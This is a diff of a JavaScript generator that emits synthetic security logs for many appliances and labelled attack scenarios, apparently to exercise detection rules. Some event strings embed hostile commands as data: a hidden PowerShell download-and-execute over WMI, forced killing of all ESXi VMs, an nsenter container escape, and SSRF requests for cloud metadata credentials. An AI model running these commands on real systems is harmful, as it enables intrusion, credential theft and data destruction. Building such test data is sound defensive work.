+          squidCode: 'TCP_MISS', status: 200, bytes: mb * 1024 * 1024,
+          elapsed: rand.int(200000, 900000), peerHost: svc, contentType: 'application/octet-stream',
+          message: `TCP_MISS/200 PUT https://${svc}/upload — ${mb} MB outbound`,
+        })];
+      },
+    },
+
+    // ---- Network edge & infrastructure ---------------------------------------
+    'net-config-tamper': {
+      label: 'Network Config Tampering', category: 'attack',
+      build() {
+        const host = rand.pick(['SW-CORE-01', 'RTR-EDGE-02']);
+        const a = rand.pick(THREAT_INTEL.ips);
+        let seq = rand.int(100000, 900000);
+        const io = (sev, fac, mnem, msg) => ({
+          srcType: 'ciscoios', vendor: 'ciscoios', host, hostIp: '10.0.0.2',
+          facility: FACILITY.local7, program: 'ios', seq: seq++,
+          severity: sev, iosFacility: fac, mnemonic: mnem, user: 'admin', srcIp: a, message: msg,
+        });
+        // Blinding the device before moving through it: drop the ACL, then stop
+        // it talking to the collector at all.
+        return [
+          io(5, 'SEC_LOGIN', 'LOGIN_SUCCESS', `Login Success [user: admin] [Source: ${a}] [localport: 22]`),
+          io(5, 'SYS', 'CONFIG_I', `Configured from vty0 (${a}) by admin: no ip access-group INBOUND_FILTER in`),
+          io(5, 'SYS', 'CONFIG_I', `Configured from vty0 (${a}) by admin: no logging host 10.0.0.100`),
+        ];
+      },
+    },
+    'citrix-exploit': {
+      label: 'Citrix Gateway Exploit', category: 'attack',
+      build() {
+        const host = 'ns-gw-01', nsip = '10.0.0.42', vip = '203.0.113.20';
+        const a = rand.pick(THREAT_INTEL.ips);
+        let msgId = rand.int(30000, 99000);
+        const ns = (sev, mod, evt, sig, msg) => ({
+          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip, facility: FACILITY.local0,
+          program: 'ns', nsMsgId: msgId++, severity: sev, nsModule: mod, nsEvent: evt,
+          srcIp: a, dstIp: vip, threatSig: sig, threatSev: sig ? 'critical' : undefined, message: msg,
+        });
+        // An unauthenticated session appearing with no preceding LOGIN is the
+        // shape of every NetScaler session-token bug.
+        return [
+          ns(2, 'APPFW', 'APPFW_MEMORY_OVERFLOW', 'NetScaler Gateway buffer overflow (CVE-2023-4966 CitrixBleed)',
+            `Context unknown@${a} - Vserver ${vip}:443 - Total_bytes_send 0 - Message "Memory overflow in nsppe, oversized Host header"`),
+          ns(3, 'SSLVPN', 'HTTPREQUEST', null,
+            `Context unknown@${a} - SessionId: 0 - User "" - Client_ip ${a} - Vserver ${vip}:443 - Total_bytes_send 4194304 - Url /oauth/idp/.well-known/openid-configuration`),
+          ns(3, 'SSLVPN', 'TCPCONNSTAT', null,
+            `Context reused-session@${a} - SessionId: 4242 - User administrator - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 - Browser_type "python-requests/2.31.0" - Group(s) "Domain Admins"`),
+        ];
+      },
+    },
+    'vpn-cred-stuffing': {
+      label: 'VPN Credential Stuffing', category: 'attack',
+      build() {
+        const host = 'ns-gw-01', nsip = '10.0.0.42', vip = '203.0.113.20';
+        const a = rand.pick(THREAT_INTEL.ips);
+        let msgId = rand.int(30000, 99000);
+        const users = ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_vpn',
+          'administrator', 'guest', 'helpdesk', 'contractor'];
+        // One password, many accounts, one source — a credential dump being
+        // replayed against the perimeter.
+        return users.map((u) => ({
+          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip, facility: FACILITY.local0,
+          program: 'ns', nsMsgId: msgId++, severity: 4, nsModule: 'AAA', nsEvent: 'LOGIN_FAILED',
+          user: u, srcIp: a,
+          message: `User ${u} - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 ` +
+            `- Browser_type "python-requests/2.31.0" - Failure_reason "External authentication server denied access"`,
+        }));
+      },
+    },
+
+    // ---- Virtualisation & containers ------------------------------------------
+    'esxi-ransomware': {
+      label: 'ESXi Ransomware Prep', category: 'attack',
+      build() {
+        const a = rand.pick(THREAT_INTEL.ips);
+        // Encrypting datastores beats encrypting guests: one host, every VM. The
+        // prep is always the same — turn on SSH, drop lockdown, stop the VMs.
+        return [
+          esx({ srcIp: a, message: `Event ${rand.int(900000, 999999)} : SSH session was opened for 'root@${a}'` }),
+          esx({ srcIp: a, esxSub: 'Hostsvc.HostAccessManager',
+            message: `Event ${rand.int(900000, 999999)} : Lockdown mode disabled for the host by root@${a}` }),
+          esx({ srcIp: a, severity: 3, esxLevel: 'error',
+            message: `Event ${rand.int(900000, 999999)} : SRV-DB-01 on esxi-01.corp.local in ha-datacenter is powered off by root@${a}` }),
+          esx({ srcIp: a, severity: 2, esxLevel: 'error', daemon: 'Vpxa', program: 'Vpxa', esxSub: 'vpxaVmprovUtil',
+            message: `Event ${rand.int(900000, 999999)} : /bin/sh -c "esxcli vm process kill --type=force --world-id=all" executed by root@${a}` }),
+        ];
+      },
+    },
+    'k8s-container-escape': {
+      label: 'Container Escape (K8s)', category: 'attack',
+      build() {
+        const a = rand.pick(THREAT_INTEL.ips), ns = rand.pick(['production', 'payments']);
+        // A privileged pod with hostPID and the node root mounted is a container
+        // escape written as a manifest — no exploit required.
+        return [
+          k8s({ verb: 'create', k8sResource: 'pods', namespace: ns, objectName: 'debug-shell',
+            srcIp: a, user: 'system:serviceaccount:default:default', groups: ['system:serviceaccounts'],
+            requestUri: `/api/v1/namespaces/${ns}/pods`, privileged: true,
+            message: `create pods/debug-shell in ${ns} — privileged:true hostPID:true hostNetwork:true hostPath:/ mounted at /host` }),
+          k8s({ verb: 'create', k8sResource: 'pods/exec', namespace: ns, objectName: 'debug-shell',
+            srcIp: a, user: 'system:serviceaccount:default:default', status: 101,
+            requestUri: `/api/v1/namespaces/${ns}/pods/debug-shell/exec?command=nsenter&command=--target&command=1&command=--mount&command=--sh`,
+            message: `create pods/exec into debug-shell in ${ns} — nsenter --target 1 --mount (break out to the node)` }),
+          k8s({ verb: 'get', k8sResource: 'secrets', namespace: 'kube-system', objectName: 'cluster-admin-token',
+            srcIp: a, user: 'system:serviceaccount:default:default', status: 200, auditLevel: 'RequestResponse',
+            requestUri: '/api/v1/namespaces/kube-system/secrets/cluster-admin-token',
+            message: 'get secrets/cluster-admin-token in kube-system — service-account token read' }),
+        ];
+      },
+    },
+
+    // ---- Identity provider (Entra ID) -----------------------------------------
+    'legacy-auth-bypass': {
+      label: 'Legacy Auth MFA Bypass', category: 'attack',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local', 'mchen@corp.local']);
+        const a = rand.pick(THREAT_INTEL.ips);
+        // IMAP/POP/SMTP AUTH predate modern auth: they cannot present an MFA
+        // challenge, so Conditional Access reports notApplied and the sign-in
+        // succeeds on a password alone.
+        return ['IMAP4', 'POP3', 'SMTP Auth'].slice(0, rand.int(2, 3)).map((app) => ent({
+          user: who, displayName: who.split('@')[0], clientApp: app, srcIp: a,
+          interactive: false, compliant: false, caStatus: 'notApplied',
+          riskLevel: 'high', riskDetail: 'unfamiliarFeatures', riskState: 'atRisk',
+          authRequirement: 'singleFactorAuthentication',
+          city: 'Lagos', countryCode: 'NG', lat: 6.52, lon: 3.37,
+          message: `Sign-in SUCCESS ${who} via ${app} from Lagos/NG (CA notApplied, single-factor, risk high)`,
+        }));
+      },
+    },
+    'oauth-consent-phish': {
+      label: 'OAuth Consent Phishing', category: 'attack',
+      build() {
+        const who = rand.pick(['jdoe@corp.local', 'asmith@corp.local']);
+        const appName = rand.pick(['Corp Doc Viewer', 'Secure Mail Sync', 'HR Onboarding Assistant']);
+        const appId = rand.uuid();
+        // The victim grants a rogue app long-lived mailbox scopes. Nothing is
+        // "compromised" — the tokens are legitimate, and a password reset does
+        // not revoke them.
+        return [
+          ent({ user: who, displayName: who.split('@')[0], appName, appId, srcIp: rand.ip(),
+            city: 'Sydney', countryCode: 'AU', lat: -33.86, lon: 151.21,
+            oauthConsent: true, consentScopes: 'Mail.ReadWrite Mail.Send offline_access Files.Read.All',
+            message: `Consent granted to third-party application "${appName}" by ${who} — scopes: Mail.ReadWrite, Mail.Send, offline_access, Files.Read.All` }),
+          ent({ user: who, displayName: who.split('@')[0], appName, appId,
+            clientApp: 'Other clients', srcIp: rand.pick(THREAT_INTEL.ips), interactive: false,
+            caStatus: 'notApplied', authRequirement: 'singleFactorAuthentication',
+            city: 'Moscow', countryCode: 'RU', lat: 55.75, lon: 37.61,
+            message: `Sign-in SUCCESS ${who} via "${appName}" service principal from Moscow/RU (non-interactive, refresh token)` }),
+        ];
+      },
+    },
+
+    // ---- Active Directory ------------------------------------------------------
+    'gpo-modification': {
+      label: 'GPO Modification', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
+        const u = rand.pick(['svc_backup', 'helpdesk']);
+        // A Group Policy Object is a scheduled task that runs everywhere. Editing
+        // the Default Domain Policy is domain-wide code execution.
+        return [
+          win(h, 3, 5136, { user: u, srcIp: rand.internalIp(),
+            message: `EventID=5136 A directory service object was modified. ObjectClass=groupPolicyContainer ObjectDN=CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local AttributeName=versionNumber Type=Value Added Account=${u}` }),
+          win(h, 3, 5136, { user: u, srcIp: rand.internalIp(),
+            message: `EventID=5136 A directory service object was modified. ObjectClass=groupPolicyContainer ObjectDN=CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local AttributeName=gPCMachineExtensionNames Type=Value Added Account=${u} (Scheduled Tasks extension added)` }),
+        ];
+      },
+    },
+    'adcs-esc1': {
+      label: 'ADCS Certificate Theft (ESC1)', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
+        const u = rand.pick(['jdoe', 'asmith', 'contractor']);
+        const src = rand.internalIp();
+        // A template that lets the requester supply the subject lets any user
+        // request a certificate *as* the domain admin — and a certificate
+        // survives a password reset.
+        return [
+          win(h, 3, 4886, { user: u, srcIp: src, program: 'Microsoft-Windows-Security-Auditing',
+            message: `EventID=4886 Certificate Services received a certificate request. RequestID=${rand.int(1000, 9999)} Requester=CORP\\${u} Template=UserAuthentication Attributes=SAN:upn=administrator@corp.local` }),
+          win(h, 2, 4887, { user: u, srcIp: src, program: 'Microsoft-Windows-Security-Auditing',
+            message: `EventID=4887 Certificate Services approved a certificate request and issued a certificate. RequestID=${rand.int(1000, 9999)} Requester=CORP\\${u} Template=UserAuthentication SubjectAltName=administrator@corp.local Disposition=Issued` }),
+        ];
+      },
+    },
+    'wmi-lateral': {
+      label: 'WMI Lateral Movement', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(['Administrator', 'svc_admin']);
+        const tgt = rand.internalIp();
+        // wmic /node: spawns a process on the remote host with no service
+        // install and no file on disk — the quiet alternative to PsExec.
+        return [
+          sym(h, 3, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`CommandLine="wmic.exe /node:${tgt} /user:CORP\\\\${u} process call create \\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://${rand.pick(THREAT_INTEL.ips)}/a.ps1')\\""`,
+              'ParentImage="C:\\Windows\\System32\\cmd.exe"', 'IntegrityLevel="High"'],
+            message: `Process Create: wmic.exe /node:${tgt} process call create — remote execution via WMI`,
+          }),
+          sym(h, 4, 3, 'Network connect', {
+            image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
+            srcIp: h.ip, dstIp: tgt, srcPort: rand.int(49152, 65535), dstPort: 135,
+            sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${tgt}"`,
+              'DestinationPort=135', 'DestinationPortName="epmap"', 'Initiated="true"'],
+            message: `Network connect: wmic.exe ${h.ip} -> ${tgt}:135 (DCOM/RPC endpoint mapper)`,
+          }),
+        ];
+      },
+    },
+
+    // ---- Web ------------------------------------------------------------------
+    'ssrf-metadata': {
+      label: 'SSRF → Cloud Metadata', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
+        // 169.254.169.254 is the EC2 instance metadata service: reachable only
+        // from the instance, so an SSRF turns it into an IAM credential vending
+        // machine for whoever controls the request.
+        return [
+          '/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+          '/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role',
+        ].slice(0, rand.int(1, 2)).map((u) => web(h, 3, a, 'GET', u, { status: 200 }));
       },
     },
   };
@@ -1018,6 +1770,538 @@
         return evs;
       },
     },
+    ciscoios: {
+      label: 'Cisco IOS (switch/router)', category: 'appliance',
+      build() {
+        const host = rand.pick(['SW-CORE-01', 'RTR-EDGE-02', 'SW-ACCESS-3850']);
+        const hostIp = `10.0.0.${rand.int(2, 30)}`;
+        let seq = rand.int(100000, 900000);
+        const base = () => ({
+          srcType: 'ciscoios', vendor: 'ciscoios', host, hostIp,
+          facility: FACILITY.local7, program: 'ios', seq: seq++,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
+          const intf = `GigabitEthernet0/${rand.int(1, 24)}`;
+          const up = rand.chance(0.6);
+          evs.push(Object.assign(base(), {
+            severity: 5, iosFacility: 'LINEPROTO', mnemonic: 'UPDOWN',
+            message: `Line protocol on Interface ${intf}, changed state to ${up ? 'up' : 'down'}`,
+          }));
+        }
+        evs.push(Object.assign(base(), {
+          severity: 5, iosFacility: 'SYS', mnemonic: 'CONFIG_I', user: 'netops', srcIp: rand.internalIp(),
+          message: 'Configured from console by netops on vty0 (10.10.1.40)',
+        }));
+        // An ACL stripped off the edge interface, by an account that authenticated
+        // from a threat-intel address. net-config-change alerts once.
+        const a = rand.pick(THREAT_INTEL.ips);
+        evs.push(Object.assign(base(), {
+          severity: 5, iosFacility: 'SEC_LOGIN', mnemonic: 'LOGIN_SUCCESS', user: 'admin', srcIp: a,
+          message: `Login Success [user: admin] [Source: ${a}] [localport: 22]`,
+        }));
+        evs.push(Object.assign(base(), {
+          severity: 5, iosFacility: 'SYS', mnemonic: 'CONFIG_I', user: 'admin', srcIp: a,
+          message: `Configured from vty0 (${a}) by admin: no ip access-group INBOUND_FILTER in`,
+        }));
+        return evs;
+      },
+    },
+    meraki: {
+      label: 'Cisco Meraki (MX)', category: 'appliance',
+      build() {
+        const host = rand.pick(['MX250-HQ', 'MX68-BRANCH', 'MX84-DC']);
+        const mac = () => Array.from({ length: 6 }, () => rand.hex(2).toUpperCase()).join(':');
+        const clientMac = mac();
+        const base = () => ({ srcType: 'meraki', vendor: 'meraki', host, facility: FACILITY.local1, program: 'meraki' });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          const src = rand.internalIp(), dst = rand.ip();
+          const sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53]);
+          evs.push(Object.assign(base(), {
+            severity: 6, merakiType: 'flows', srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, proto: 'tcp',
+            merakiFields: [`src=${src}`, `dst=${dst}`, `mac=${clientMac}`, 'protocol=tcp',
+              `sport=${sport}`, `dport=${dport}`, 'pattern:', 'allow', 'all'],
+            message: `flows allow ${src}:${sport} -> ${dst}:${dport}`,
+          }));
+        }
+        const src = rand.internalIp(), u = rand.pick(URLS);
+        evs.push(Object.assign(base(), {
+          severity: 6, merakiType: 'urls', srcIp: src, dstIp: rand.ip(), url: u,
+          merakiFields: [`src=${src}:${rand.int(1024, 65535)}`, `dst=${rand.ip()}:80`, `mac=${clientMac}`,
+            'request:', 'GET', `http://intranet.corp.local${u}`],
+          message: `urls GET http://intranet.corp.local${u}`,
+        }));
+        // Meraki's IDS is Snort under the hood, so the alert carries a Snort SID.
+        const ids = rand.pick([
+          ['1:2018358:10', 'MALWARE-CNC Win.Trojan.Emotet outbound connection'],
+          ['1:45148:1', 'BROWSER-IE Microsoft Internet Explorer Array out of bounds write attempt'],
+          ['1:58722:2', 'SERVER-OTHER Apache Log4j logging remote code execution attempt'],
+        ]);
+        const bad = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
+        evs.push(Object.assign(base(), {
+          severity: 4, merakiType: 'security_event ids_alerted',
+          srcIp: bad, dstIp: vic, srcPort: 80, dstPort: rand.int(1024, 65535), proto: 'tcp',
+          threatSig: ids[1], threatSev: 'high',
+          merakiFields: [`signature=${ids[0]}`, 'priority=1', `timestamp=${(Date.now() / 1000).toFixed(6)}`,
+            `dhost=${clientMac}`, 'direction=ingress', 'protocol=tcp/ip',
+            `src=${bad}:80`, `dst=${vic}:${rand.int(1024, 65535)}`, 'message:', ids[1]],
+          message: `security_event ids_alerted ${ids[1]}`,
+        }));
+        return evs;
+      },
+    },
+    citrix: {
+      label: 'Citrix NetScaler (Gateway)', category: 'appliance',
+      build() {
+        const host = rand.pick(['ns-gw-01', 'netscaler-vpx-02']);
+        const nsip = `10.0.0.${rand.int(40, 60)}`;
+        const vip = `203.0.113.${rand.int(10, 90)}`;
+        let msgId = rand.int(30000, 99000);
+        const base = () => ({
+          srcType: 'citrix', vendor: 'citrix', host, hostIp: nsip,
+          facility: FACILITY.local0, program: 'ns', nsMsgId: msgId++,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          const u = rand.pick(USERS), ip = rand.ip();
+          evs.push(Object.assign(base(), {
+            severity: 6, nsModule: 'SSLVPN', nsEvent: 'LOGIN', user: u, srcIp: ip,
+            message: `Context ${u}@${ip} - SessionId: ${rand.int(1000, 9999)} - User ${u} - Client_ip ${ip} ` +
+              `- Nat_ip "Mapped Ip" - Vserver ${vip}:443 - Browser_type "Mozilla/5.0" - SSLVPN_client_type ICA - Group(s) "Staff"`,
+          }));
+        }
+        // Credential stuffing against the Gateway: many accounts, one source, one
+        // password. vpn-brute correlates the burst and alerts once.
+        const a = rand.pick(THREAT_INTEL.ips);
+        ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_vpn', 'administrator', 'guest'].forEach((u) => {
+          evs.push(Object.assign(base(), {
+            severity: 4, nsModule: 'AAA', nsEvent: 'LOGIN_FAILED', user: u, srcIp: a,
+            message: `User ${u} - Client_ip ${a} - Nat_ip "Mapped Ip" - Vserver ${vip}:443 ` +
+              `- Browser_type "python-requests/2.31.0" - Failure_reason "External authentication server denied access"`,
+          }));
+        });
+        return evs;
+      },
+    },
+    squid: {
+      label: 'Squid (proxy)', category: 'appliance',
+      build() {
+        const host = 'proxy-01';
+        const pid = rand.int(1000, 9000);
+        const base = () => ({
+          srcType: 'squid', vendor: 'squid', host, hostIp: '10.10.0.8',
+          facility: FACILITY.local6, program: 'squid', pid,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
+          const src = rand.internalIp(), dom = rand.pick(DOMAINS);
+          evs.push(Object.assign(base(), {
+            severity: 6, srcIp: src, method: 'GET', url: `http://${dom}${rand.pick(URLS)}`,
+            squidCode: rand.pick(['TCP_MISS', 'TCP_HIT', 'TCP_REFRESH_MODIFIED']), status: 200,
+            bytes: rand.int(400, 90000), elapsed: rand.int(2, 400),
+            user: rand.pick(USERS), peerStatus: 'DIRECT', peerHost: dom, contentType: 'text/html',
+            message: `TCP_MISS/200 GET http://${dom}${rand.pick(URLS)}`,
+          }));
+        }
+        // A CONNECT to a Tor entry guard on 9001 — the proxy allowed it, and the
+        // covert-c2 rule is what notices. One alert for the burst.
+        const src = rand.internalIp();
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const guard = `${rand.int(1, 223)}.${rand.int(0, 255)}.${rand.int(0, 255)}.${rand.int(1, 254)}`;
+          evs.push(Object.assign(base(), {
+            severity: 4, srcIp: src, method: 'CONNECT', url: `${guard}:9001`,
+            squidCode: 'TCP_TUNNEL', status: 200, bytes: rand.int(40000, 900000),
+            elapsed: rand.int(40000, 200000), user: rand.pick(USERS),
+            peerStatus: 'DIRECT', peerHost: guard, contentType: '-', torExit: true,
+            message: `TCP_TUNNEL/200 CONNECT ${guard}:9001`,
+          }));
+        }
+        return evs;
+      },
+    },
+    esxi: {
+      label: 'VMware ESXi', category: 'appliance',
+      build() {
+        const host = rand.pick(['esxi-01.corp.local', 'esxi-04.corp.local']);
+        const base = (daemon, sub) => ({
+          srcType: 'esxi', vendor: 'esxi', host, hostIp: `10.10.4.${rand.int(10, 40)}`,
+          facility: FACILITY.local4, program: daemon, daemon, esxSub: sub,
+          pid: rand.int(200000, 2999999), opId: rand.hex(8), user: 'root', esxLevel: 'info',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          const vm = rand.pick(['SRV-DB-01', 'SRV-APP-02', 'SRV-FILE-03']);
+          evs.push(Object.assign(base('Hostd', 'Vimsvc.ha-eventmgr'), {
+            severity: 6, user: 'vpxuser',
+            message: `Event ${rand.int(900000, 999999)} : ${vm} on ${host} in ha-datacenter is powered on`,
+          }));
+        }
+        evs.push(Object.assign(base('Vpxa', 'vpxavpxaInvtHost'), {
+          severity: 6, user: 'vpxuser',
+          message: `Completed host inventory sync, took ${rand.int(20, 900)} ms`,
+        }));
+        // Ransomware crews turn on SSH and drop lockdown mode before encrypting
+        // datastores — hypervisor-threat alerts once on the burst.
+        const a = rand.pick(THREAT_INTEL.ips);
+        evs.push(Object.assign(base('Hostd', 'Vimsvc.ha-eventmgr'), {
+          severity: 4, esxLevel: 'warning', srcIp: a,
+          message: `Event ${rand.int(900000, 999999)} : SSH session was opened for 'root@${a}'`,
+        }));
+        evs.push(Object.assign(base('Hostd', 'Hostsvc.HostAccessManager'), {
+          severity: 4, esxLevel: 'warning', srcIp: a,
+          message: `Event ${rand.int(900000, 999999)} : Lockdown mode disabled for the host by root@${a}`,
+        }));
+        return evs;
+      },
+    },
+    suricata: {
+      label: 'Suricata (EVE JSON)', category: 'appliance',
+      build() {
+        const host = 'ids-sensor-02';
+        const pid = rand.int(1000, 9000);
+        const base = (type) => ({
+          srcType: 'suricata', vendor: 'suricata', host, hostIp: '10.0.0.11',
+          facility: FACILITY.local2, program: 'suricata', pid, eveType: type,
+          flowId: rand.int(1e14, 9e14), iface: 'eth0',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
+          const src = rand.internalIp(), dst = rand.ip();
+          evs.push(Object.assign(base('flow'), {
+            severity: 6, srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535),
+            dstPort: rand.pick([443, 80]), proto: 'TCP', appProto: 'tls',
+            pktsOut: rand.int(6, 90), pktsIn: rand.int(6, 120),
+            bytesOut: rand.int(600, 40000), bytesIn: rand.int(600, 90000), flowState: 'closed',
+            message: `flow ${src} -> ${dst} tls closed`,
+          }));
+        }
+        const sig = rand.pick([
+          [2018358, 'ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1', 'Potentially Bad Traffic', 2],
+          [2025644, 'ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)', 'Attempted Administrator Privilege Gain', 1],
+          [2027865, 'ET MALWARE Cobalt Strike Beacon Observed', 'A Network Trojan was detected', 1],
+          [2019401, 'ET POLICY SMB2 NT Create AndX Request For an Executable File', 'Potential Corporate Privacy Violation', 2],
+        ]);
+        const bad = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
+        evs.push(Object.assign(base('alert'), {
+          severity: 2, srcIp: bad, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443,
+          proto: 'TCP', appProto: 'http', action: 'blocked', gid: 1, sid: sig[0], rev: 3,
+          sigName: sig[1], classification: sig[2], priority: sig[3],
+          threatSig: sig[1], threatSev: sig[3] === 1 ? 'critical' : 'high',
+          message: `alert ${sig[1]}`,
+        }));
+        return evs;
+      },
+    },
+    sysmon: {
+      // Sysmon writes to its own Windows event channel; NXLog (or Snare) is what
+      // relays it, so this source declares transport 'agent'.
+      label: 'Sysmon (Windows)', category: 'appliance', transport: 'agent',
+      build() {
+        const h = rand.pick(HOSTS.windows);
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          const exe = rand.pick(['chrome.exe', 'Teams.exe', 'OUTLOOK.EXE', 'Code.exe']);
+          evs.push(sym(h, 6, 1, 'Process Create', {
+            image: `C:\\Program Files\\${exe}`,
+            sysmonFields: [`CommandLine="C:\\Program Files\\${exe}"`,
+              'ParentImage="C:\\Windows\\explorer.exe"', 'IntegrityLevel="Medium"',
+              `Hashes="SHA256=${rand.hex(64).toUpperCase()}"`],
+            message: `Process Create: ${exe}`,
+          }));
+        }
+        const dst = rand.ip();
+        evs.push(sym(h, 6, 3, 'Network connect', {
+          image: 'C:\\Program Files\\chrome.exe',
+          srcIp: h.ip, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: 443,
+          sysmonFields: ['Protocol="tcp"', `SourceIp="${h.ip}"`, `DestinationIp="${dst}"`,
+            'DestinationPort=443', 'Initiated="true"'],
+          message: `Network connect: chrome.exe ${h.ip} -> ${dst}:443`,
+        }));
+        evs.push(sym(h, 6, 11, 'File created', {
+          image: 'C:\\Program Files\\OUTLOOK.EXE',
+          sysmonFields: [`TargetFilename="C:\\Users\\${rand.pick(USERS)}\\AppData\\Local\\Temp\\att${rand.int(100, 999)}.tmp"`],
+          message: 'File created: AppData\\Local\\Temp attachment cache',
+        }));
+        // One handle request into LSASS with dump-capable rights closes the burst
+        // — the cred-dumping rule alerts once on it.
+        evs.push(sym(h, 2, 10, 'Process accessed', {
+          image: 'C:\\Windows\\System32\\rundll32.exe',
+          sysmonFields: ['SourceImage="C:\\Windows\\System32\\rundll32.exe"',
+            'TargetImage="C:\\Windows\\System32\\lsass.exe"', 'GrantedAccess="0x1438"',
+            'CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C"'],
+          message: 'Process accessed: rundll32.exe -> C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1438',
+        }));
+        return evs;
+      },
+    },
+    zeek: {
+      // Zeek writes log files, not syslog — Filebeat or rsyslog imfile ships
+      // them, so this source declares transport 'agent'.
+      label: 'Zeek (NSM)', category: 'appliance', transport: 'agent',
+      build() {
+        const host = 'zeek-sensor-01';
+        const base = (path) => ({
+          srcType: 'zeek', vendor: 'zeek', host, facility: FACILITY.local3, program: 'zeek',
+          zeekPath: path, uid: `C${rand.id()}${rand.id().slice(0, 4)}`, severity: 6,
+        });
+        const evs = [];
+        const victim = rand.internalIp();
+        // Benign conn.log flows. Field order is Zeek's own:
+        // ts uid orig_h orig_p resp_h resp_p proto service duration orig_bytes
+        // resp_bytes conn_state local_orig local_resp missed_bytes history
+        // orig_pkts orig_ip_bytes resp_pkts resp_ip_bytes
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53]);
+          const ob = rand.int(400, 9000), rb = rand.int(600, 90000), pkts = rand.int(6, 60);
+          evs.push(Object.assign(base('conn'), {
+            srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport, proto: 'tcp',
+            zeekFields: [src, String(rand.int(1024, 65535)), dst, String(dport), 'tcp',
+              dport === 443 ? 'ssl' : (dport === 53 ? 'dns' : 'http'),
+              rand.float(0.2, 12).toFixed(6), String(ob), String(rb), 'SF', 'T', 'F', '0',
+              'ShADadFf', String(pkts), String(ob + pkts * 40), String(pkts), String(rb + pkts * 40)],
+            message: `conn ${src} -> ${dst}:${dport} tcp SF ${ob}/${rb} bytes`,
+          }));
+        }
+        // dns.log: ts uid orig_h orig_p resp_h resp_p proto trans_id rtt query
+        // qclass_name qtype_name rcode_name answers
+        const q = rand.pick(DOMAINS);
+        evs.push(Object.assign(base('dns'), {
+          srcIp: victim, dstIp: '10.10.0.53', srcPort: rand.int(1024, 65535), dstPort: 53, proto: 'udp', domain: q,
+          zeekFields: [victim, String(rand.int(1024, 65535)), '10.10.0.53', '53', 'udp',
+            String(rand.int(1000, 65535)), rand.float(0.001, 0.09).toFixed(6), q,
+            'C_INTERNET', 'A', 'NOERROR', rand.ip()],
+          message: `dns ${victim} query ${q} A NOERROR`,
+        }));
+        // A beacon: same internal host to one known-bad IP, near-identical byte
+        // counts at a fixed cadence. c2-beacon alerts once on the pair.
+        const c2 = rand.pick(THREAT_INTEL.ips), sport = rand.int(40000, 60000);
+        for (let i = 0, n = rand.int(4, 6); i < n; i++) {
+          const ob = 281 + rand.int(0, 6), rb = 1140 + rand.int(0, 12);
+          evs.push(Object.assign(base('conn'), {
+            severity: 4, srcIp: victim, dstIp: c2, srcPort: sport + i, dstPort: 443, proto: 'tcp',
+            zeekFields: [victim, String(sport + i), c2, '443', 'tcp', 'ssl',
+              (60 + rand.float(-0.4, 0.4)).toFixed(6), String(ob), String(rb), 'SF', 'T', 'F', '0',
+              'ShADadFf', '9', String(ob + 360), '9', String(rb + 360)],
+            message: `conn ${victim} -> ${c2}:443 tcp SF ${ob}/${rb} bytes (60s interval)`,
+          }));
+        }
+        // ssl.log: ts uid orig_h orig_p resp_h resp_p version cipher server_name
+        // established ja3 ja3s — the JA3 is Cobalt Strike's default profile.
+        evs.push(Object.assign(base('ssl'), {
+          severity: 4, srcIp: victim, dstIp: c2, srcPort: sport, dstPort: 443, proto: 'tcp',
+          zeekFields: [victim, String(sport), c2, '443', 'TLSv12',
+            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', rand.pick(THREAT_INTEL.domains), 'T',
+            'a0e9f5d64349fb13191bc781f81f42e1', 'ae4edc6faf64d08308082ad26be60767'],
